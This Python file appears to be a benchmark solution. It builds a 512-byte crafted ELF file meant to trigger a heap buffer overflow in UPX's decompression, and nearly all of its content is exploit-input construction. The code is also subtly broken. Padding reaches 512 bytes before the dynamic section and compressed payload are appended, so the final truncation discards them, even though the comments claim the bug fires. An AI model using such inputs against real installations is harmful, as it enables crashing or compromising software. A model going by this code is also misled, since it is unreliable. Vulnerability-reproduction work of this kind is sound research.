import os
import struct
import subprocess
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal ELF shared library with crafted compression
        # that triggers the heap buffer overflow vulnerability
        
        # ELF header (64-bit)
        elf_header = bytearray([
            0x7f, 0x45, 0x4c, 0x46,  # ELF magic
            0x02,                    # 64-bit
            0x01,                    # Little endian
            0x01,                    # ELF version
            0x00,                    # OS ABI
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Padding
            0x03, 0x00,              # ET_DYN (shared object)
            0x3e, 0x00,              # x86-64
            0x01, 0x00, 0x00, 0x00,  # ELF version
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Entry point
            0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Program header offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Section header offset
            0x00, 0x00, 0x00, 0x00,  # Flags
            0x40, 0x00,              # ELF header size
            0x38, 0x00,              # Program header entry size
            0x02, 0x00,              # Number of program headers
            0x40, 0x00,              # Section header entry size
            0x00, 0x00,              # Number of section headers
            0x00, 0x00,              # Section header string table index
        ])
        
        # Program headers
        # First: PT_LOAD with low memory region
        phdr1 = bytearray([
            0x01, 0x00, 0x00, 0x00,  # PT_LOAD
            0x07, 0x00, 0x00, 0x00,  # Flags: RWE
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Mem size
            0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Alignment
        ])
        
        # Second: PT_DYNAMIC with DT_INIT for un_DT_INIT() operation
        phdr2 = bytearray([
            0x02, 0x00, 0x00, 0x00,  # PT_DYNAMIC
            0x06, 0x00, 0x00, 0x00,  # Flags: RW
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Virtual address
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Physical address
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # File size
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Mem size
            0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Alignment
        ])
        
        # Dynamic section with DT_INIT and other entries
        # Craft to trigger unsafe lowmem usage and ph.method issues
        dynamic = bytearray()
        
        # DT_NULL at the end
        dynamic += struct.pack('<QQ', 0, 0)
        
        # DT_INIT entry - will be processed by un_DT_INIT()
        dynamic += struct.pack('<QQ', 0x0c, 0x4141414141414141)
        
        # Additional entries to fill space
        for i in range(20):
            dynamic += struct.pack('<QQ', i, 0x4242424242424242)
        
        # Now create the compressed data with b_info structure
        # that triggers the improper resetting of ph.method
        compressed_data = bytearray()
        
        # First b_info block with method that won't be properly reset
        # sz_unc, sz_cpr, method
        b_info1 = struct.pack('<III', 0x100, 0x50, 0x01)
        compressed_data += b_info1
        
        # Compressed data for first block - crafted to trigger overflow
        # during decompression when file_image[] is treated as not ReadOnly
        compressed_data += b'A' * 0x50
        
        # Second b_info block - method should reset but vulnerability prevents it
        # Using large sz_unc to trigger heap overflow
        b_info2 = struct.pack('<III', 0x1000, 0x100, 0x02)
        compressed_data += b_info2
        
        # Crafted compressed data that will cause unsafe lowmem access
        # during decompression operation
        overflow_pattern = bytearray()
        
        # Pattern designed to trigger the specific vulnerability:
        # - Causes ph.method to not reset properly
        # - Triggers unsafe lowmem[0, +xct_off) usage
        # - Causes issues in un_DT_INIT() operation
        for i in range(0x100):
            overflow_pattern.append((i % 256))
        
        compressed_data += overflow_pattern
        
        # Combine everything
        poc = bytearray()
        poc += elf_header
        poc += phdr1
        poc += phdr2
        
        # Pad to align dynamic section
        while len(poc) < 0x200:
            poc.append(0)
        
        poc += dynamic
        
        # Add compressed data section
        # This mimics the UPX/ELF compression format that triggers the bug
        poc += b'UPX!'
        poc += compressed_data
        
        # Ensure exactly 512 bytes as ground truth indicates
        if len(poc) > 512:
            poc = poc[:512]
        else:
            poc += b'\x00' * (512 - len(poc))
        
        return bytes(poc)